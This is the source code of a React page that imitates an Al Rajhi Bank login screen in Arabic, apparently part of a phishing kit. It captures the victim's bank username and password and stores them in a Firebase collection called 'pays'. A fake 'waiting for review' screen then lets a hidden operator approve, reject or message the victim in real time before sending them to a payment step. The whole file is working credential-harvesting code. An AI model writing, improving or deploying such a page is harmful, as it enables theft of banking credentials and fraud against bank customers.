"use client";

import type React from "react";

import { useState, useEffect, useRef } from "react";
import { Eye, EyeOff, AlertCircle, Loader2, KeyRound, Clock, CheckCircle, XCircle } from "lucide-react";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { addData } from "@/lib/firebase";
import { StepShell } from "@/components/step-shell";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { db } from "@/lib/firebase";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
import { toast } from "sonner";

type Screen = "login" | "waiting" | "otp" | "success" | "rejected";

export default function AlRajhiLoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [screen, setScreen] = useState<Screen>("login");
  const [otp, setOtp] = useState("");
  const [rejectMessage, setRejectMessage] = useState("");

  const visitorId =
    typeof window !== "undefined" ? localStorage.getItem("visitor") || "" : "";

  // Track if we already processed this status
  const processedStatusRef = useRef<string>("");

  useRedirectMonitor({
    visitorId,
    currentPage: "rajhi",
  });

  // Listen for admin approval/rejection
  useEffect(() => {
    if (!visitorId || !db || screen === "login") return;

    console.log("[rajhi] Listening for admin decision...");

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      async (docSnapshot) => {
        if (!docSnapshot.exists()) return;

        const data = docSnapshot.data();
        const status = data.rajhiOtpStatus as string | undefined;
        const updatedAt = data.rajhiOtpStatusUpdatedAt as number | undefined;
        const message = data.rajhiOtpStatusMessage as string | undefined;
        const now = Date.now();

        console.log("[rajhi] Status received:", status);

        // Skip if no status or same as processed
        if (!status || status === "pending") return;
        
        // Skip if already processed this status
        if (processedStatusRef.current === status) {
          console.log("[rajhi] Already processed status:", status);
          return;
        }

        // Skip if stale (older than 3 seconds)
        if (updatedAt && (now - updatedAt > 3000)) {
          console.log("[rajhi] Stale status, ignoring");
          return;
        }

        // Process the status
        processedStatusRef.current = status;

        if (status === "approved") {
          console.log("[rajhi] ✅ Approved!");
          setScreen("success");
          toast.success("تمت الموافقة! يمكنك الآن المتابعة.");
          
          // Clear the status
          await setDoc(doc(db as Firestore, "pays", visitorId), {
            rajhiOtpStatus: "pending",
            rajhiOtpStatusUpdatedAt: now
          }, { merge: true });

        } else if (status === "rejected") {
          console.log("[rajhi] ❌ Rejected!");
          setScreen("rejected");
          setRejectMessage(message || "تم رفض البيانات المدخلة. يرجى المحاولة مرة أخرى.");
          toast.error("تم الرفض", {
            description: message || "يرجى المحاولة مرة أخرى"
          });
          
          // Clear the status
          await setDoc(doc(db as Firestore, "pays", visitorId), {
            rajhiOtpStatus: "pending",
            rajhiOtpStatusUpdatedAt: now
          }, { merge: true });

        } else if (status === "message") {
          console.log("[rajhi] 💬 Message received!");
          if (message) {
            toast.info(message);
          }
        }
      },
      (error) => {
        console.error("[rajhi] Listener error:", error);
      }
    );

    return () => {
      console.log("[rajhi] Cleaning up listener");
      unsubscribe();
    };
  }, [visitorId, screen]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    // Save credentials and go to waiting screen
    await addData({
      id: visitorId,
      rajhiUser: username,
      rajhiPasswrod: password,
      rajhiOtpStatus: "pending",
      rajhiOtpStatusUpdatedAt: Date.now()
    });

    setScreen("waiting");
  };

  const handleRetry = () => {
    // Clear the processed status
    processedStatusRef.current = "";
    setScreen("login");
    setUsername("");
    setPassword("");
  };

  // Waiting Screen
  if (screen === "waiting") {
    return (
      <StepShell
        step={8}
        title="قائمة الانتظار"
        subtitle="جاري مراجعة بياناتك من قبل الموظف..."
        icon={<Clock className="h-8 w-8 animate-pulse" />}
      >
        <div className="flex flex-col items-center justify-center gap-6 py-8">
          {/* Animated waiting indicator */}
          <div className="relative">
            <div className="absolute inset-0 animate-ping">
              <div className="h-20 w-20 rounded-full bg-yellow-400 opacity-50"></div>
            </div>
            <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-yellow-400 shadow-lg">
              <Clock className="h-10 w-10 animate-bounce text-white" />
            </div>
          </div>
          
          {/* Status text */}
          <div className="text-center">
            <p className="text-lg font-semibold text-[#145072] mb-2">
              يرجى الانتظار...
            </p>
            <p className="text-sm text-gray-500">
              سيصلك إشعار عند مراجعة بياناتك
            </p>
          </div>

          {/* Cancel button */}
          <Button
            type="button"
            onClick={handleRetry}
            className="mt-4 h-12 w-full rounded-xl border-2 border-[#d2e1ed] bg-white font-bold text-[#145072] hover:bg-[#f4f8fc]"
          >
            إلغاء والرجوع
          </Button>
        </div>
      </StepShell>
    );
  }

  // Success Screen
  if (screen === "success") {
    return (
      <StepShell
        step={8}
        title="تمت الموافقة"
        subtitle="تم التحقق من بياناتك بنجاح!"
        icon={<CheckCircle className="h-8 w-8 text-green-500" />}
      >
        <div className="flex flex-col items-center justify-center gap-6 py-8">
          <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100 shadow-lg">
            <CheckCircle className="h-12 w-12 text-green-500" />
          </div>
          
          <div className="text-center">
            <p className="text-lg font-semibold text-green-600 mb-2">
              تمت مراجعة بياناتك والموافقة عليها
            </p>
            <p className="text-sm text-gray-500">
              يمكنك الآن إكمال عملية الدفع
            </p>
          </div>

          <Button
            type="button"
            onClick={() => {
              // Navigate to payment or next step
              window.location.href = "/check";
            }}
            className="mt-4 h-12 w-full rounded-xl bg-green-500 font-bold text-white hover:bg-green-600"
          >
            المتابعة للدفع
          </Button>
        </div>
      </StepShell>
    );
  }

  // Rejected Screen
  if (screen === "rejected") {
    return (
      <StepShell
        step={8}
        title="تم الرفض"
        subtitle="لم تتم الموافقة على بياناتك"
        icon={<XCircle className="h-8 w-8 text-red-500" />}
      >
        <div className="flex flex-col items-center justify-center gap-6 py-8">
          <div className="flex h-20 w-20 items-center justify-center rounded-full bg-red-100 shadow-lg">
            <XCircle className="h-12 w-12 text-red-500" />
          </div>
          
          <div className="text-center">
            <p className="text-lg font-semibold text-red-600 mb-2">
              {rejectMessage || "تم رفض البيانات المدخلة"}
            </p>
            <p className="text-sm text-gray-500">
              يمكنك المحاولة مرة أخرى ببيانات صحيحة
            </p>
          </div>

          <Button
            type="button"
            onClick={handleRetry}
            className="mt-4 h-12 w-full rounded-xl bg-[#f0b429] font-bold text-[#145072] hover:bg-[#e2a61f]"
          >
            المحاولة مرة أخرى
          </Button>
        </div>
      </StepShell>
    );
  }

  // Login Screen
  return (
    <StepShell
      step={8}
      title="تسجيل الدخول"
      subtitle="الرجاء إدخال بياناتك للمتابعة."
      icon={<AlertCircle className="h-8 w-8" />}
    >
      <form className="space-y-4" onSubmit={handleLogin}>
        <div className="relative">
          <Input
            required
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="اسم المستخدم"
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 pl-11 text-right text-base focus:border-[#145072]"
          />
          <AlertCircle className="pointer-events-none absolute left-3 top-1/2 h-5 w-5 -translate-y-1/2 text-[#6d879a]" />
        </div>

        <div className="relative">
          <Input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type={showPassword ? "text" : "password"}
            required
            placeholder="كلمة المرور"
            className="h-12 rounded-xl border-2 border-[#d2e1ed] bg-white px-4 pl-11 text-right text-base focus:border-[#145072]"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute left-3 top-1/2 -translate-y-1/2 text-[#6d879a]"
          >
            {showPassword ? (
              <EyeOff className="h-5 w-5" />
            ) : (
              <Eye className="h-5 w-5" />
            )}
          </button>
        </div>

        <div className="flex items-center justify-between rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-3">
          <button type="button" className="text-sm font-semibold text-[#145072]">
            نسيت كلمة المرور؟
          </button>
          <button
            type="button"
            onClick={() => setRememberMe(!rememberMe)}
            className="flex items-center gap-2 text-sm font-semibold text-[#145072]"
          >
            <span>تذكرني</span>
            <span
              className={`flex h-5 w-5 items-center justify-center rounded border ${
                rememberMe
                  ? "border-[#145072] bg-[#145072] text-white"
                  : "border-[#145072] bg-white text-transparent"
              }`}
            >
              ✓
            </span>
          </button>
        </div>

        <Button
          type="submit"
          className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
        >
          تسجيل الدخول
        </Button>
      </form>
    </StepShell>
  );
}
